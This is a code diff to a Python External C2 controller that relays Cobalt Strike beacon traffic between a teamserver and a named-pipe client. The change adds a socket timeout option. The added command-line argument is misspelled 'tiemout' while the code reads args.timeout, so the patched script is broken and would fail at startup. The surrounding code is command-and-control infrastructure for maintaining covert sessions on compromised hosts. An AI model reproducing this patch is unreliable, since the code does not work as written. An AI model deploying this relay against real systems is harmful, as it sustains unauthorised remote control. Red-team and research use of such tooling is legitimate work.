@@ -18,7 +18,7 @@ class SocketInfo:
     """
     @brief Class to hold info for TCP session
     """
-    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str):
+    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str, timeout):
         """
 
         :param ts_ip: IP address of CS Teamserver
@@ -26,6 +26,7 @@ class SocketInfo:
         :param srv_ip: IP to bind to on server
         :param srv_port: Port of server to listen on
         :param pipe_str: String for named pipe on client
+        :param timeout: The socket timeout option (in seconds)
         """
         if len(pipe_str) > 50:
             raise ValueError('pipe_str must be less than 50 characters')
@@ -34,6 +35,7 @@ class SocketInfo:
         self.srv_ip = srv_ip
         self.srv_port = srv_port
         self.pipe_str = pipe_str
+        self.timeout = timeout
         
 
 class ExternalC2Controller:
@@ -277,7 +279,7 @@ class ExternalC2Controller:
             self.client_seqnum = (struct.unpack("<I", data))[0]
             self.clientAddr = clientAddr
             self.client_seqnum += 1
-
+            self._socketServer.settimeout(socketInfo.timeout)
             socketList = []                         #Select function takes in an iterable of sockets,
             socketList.append(self._socketServer)   #so we wrap our socket in a list.
 
@@ -337,12 +339,13 @@ parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
 parser.add_argument('srv_ip', help="IP to bind to on server.")
 parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
 parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
+parser.add_argument('tiemout', type=int, help="The socket timeout option (in seconds) set by settimeout()")
 parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
 #TODO: Troubleshoot why x64 didnt work..
 #parser.add_argument('--arch', '-a', choices=['x86', 'x64'], default='x86', type=str, help="Architecture to use for beacon. x86 or x64. Default is x86.")
 args = parser.parse_args()
 controller = ExternalC2Controller(args.teamserver_port)
-socketInfo = SocketInfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str)
+socketInfo = SocketInfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str, args.timeout)
 while True:
     controller.run(socketInfo, 'x86')
     print('waiting 10s before reconnecting to TS')
